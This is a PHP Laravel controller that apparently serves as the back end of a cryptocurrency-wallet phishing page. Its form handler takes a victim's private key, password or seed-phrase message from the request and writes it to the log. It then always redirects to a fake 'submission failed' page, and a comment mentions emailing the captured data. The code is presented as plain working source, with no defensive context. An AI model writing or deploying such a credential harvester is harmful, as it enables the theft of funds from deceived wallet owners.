<?php

namespace App\Http\Controllers;
use Illuminate\Support\Facades\Storage;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Log;

class WalletController extends Controller
{
   
    /**
     * Show the application dashboard.
     *
     * @return \Illuminate\Contracts\Support\Renderable
     */
    public function index()
    {
        // $responses = File::get(storage_path('response.json'));
        $data = Storage::get('response.json');
        $responses = json_decode($data,true);

        // Log::info($responses);
        return view('wallet',compact('responses'));
        // return view('home');
    }

    public function form(Request $request)
    {
       //get the request and send an email 
       //redirect to the final page

    $privatekey = $request->privatekey;
    $password = $request->password;
    $message = $request->message;
    
    if(!empty($privatekey)){
        Log::info("INSIDE PRIVATEKEY");
        Log::info($privatekey);
    }elseif (!empty($password)) {
        Log::info("INSIDE PASSWORD");
        Log::info($password);
    }elseif (!empty($message)) {
        Log::info("INSIDE MESSAGE");
        Log::info($message);
    }
        return redirect('/wallets/submission/failed');
    }

    public function qrcode()
    {
       
        return view('qrpage');
    }
}
